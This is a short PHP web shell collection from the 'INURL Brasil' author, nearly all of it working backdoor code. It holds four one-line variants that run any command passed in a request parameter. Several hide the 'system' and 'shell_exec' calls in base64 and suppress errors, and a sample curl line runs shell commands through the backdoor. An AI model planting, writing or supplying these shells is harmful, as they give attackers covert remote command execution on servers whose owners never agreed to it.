# INURL - BRASIL / Simple Shell PHP
 
# AUTOR:         Cleiton Pinheiro / Nick: googleINURL
# Email:         inurlbr@gmail.com
# Blog:          http://blog.inurl.com.br
# Twitter:       https://twitter.com/googleinurl
# Fanpage:       https://fb.com/InurlBrasil
# Pastebin       http://pastebin.com/u/Googleinurl
# GIT:           https://github.com/googleinurl
# PSS:           http://packetstormsecurity.com/user/googleinurl
# EA:            http://www.exploit4arab.net/author/248/Cleiton_Pinheiro
# YOUTUBE:       http://youtube.com/c/INURLBrasil
# PLUS:          http://google.com/+INURLBrasil
# ARTIGO:        http://blog.inurl.com.br/2015/03/inurl-brasil-simple-shell-backdoor.html
#-----------------------------------------------------------------------------------------------

# EXECUTE:       curl "http://localhost/of.php?0=uname%20-a%20%26%26%20ls%20-la"

# MODEL-01 CODE >>
<?php $__=@base64_decode("c3lzdGVt");echo@$__(isset($_REQUEST[0])?$_REQUEST[0]:NULL);?>

# MODEL-02 CODE >>
<?php print(`{$_REQUEST[0]}`);?>

# MODEL-03 CODE >>
<?php $_=$_REQUEST[0];@$__=@create_function('$_',base64_decode("ZWNobyhzaGVsbF9leGVjKCRfKSk7"));@$__($_); 

# MODEL-04 CODE ERROR REPORT = 0 >>
<?php error_reporting(0).$__=@base64_decode("c3lzdGVt");@$__(isset($_REQUEST[0])?$_REQUEST[0]:NULL);

# REF:
# http://php.net/manual/en/language.operators.execution.php#language.operators.execution
# https://thehackerblog.com/a-look-into-creating-a-truley-invisible-php-shell
# http://www.businessinfo.co.uk/labs/talk/Nonalpha.pdf